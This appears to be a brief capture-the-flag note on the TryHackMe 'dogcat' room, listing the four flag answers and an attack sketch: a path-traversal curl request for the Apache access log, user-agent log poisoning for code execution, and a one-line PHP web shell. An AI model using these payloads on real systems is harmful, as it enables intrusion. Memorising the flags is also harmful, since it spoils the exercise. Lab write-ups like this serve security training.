# dogcat
I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

[https://tryhackme.com/room/dogcat](https://tryhackme.com/room/dogcat)

---

# Task 1 - Dogcat
I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!

This machine may take a few minutes to fully start up.

## Answer the questions below

*What is flag 1?*
`THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`
*What is flag 2?*
`THM{LF1_t0_RC3_aec3fb}`
*What is flag 3?*
`THM{D1ff3r3nt_3nv1ronments_874112}`
*What is flag 4?*
`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`


# Notes

LFI through:
`curl -s "http://$IP/?view=dog/../../../../../../../var/log/apache2/access.log&ext="`

Poison access log via user-agent for rce

make exploit.py



<?php system($_GET['cmd']);?>
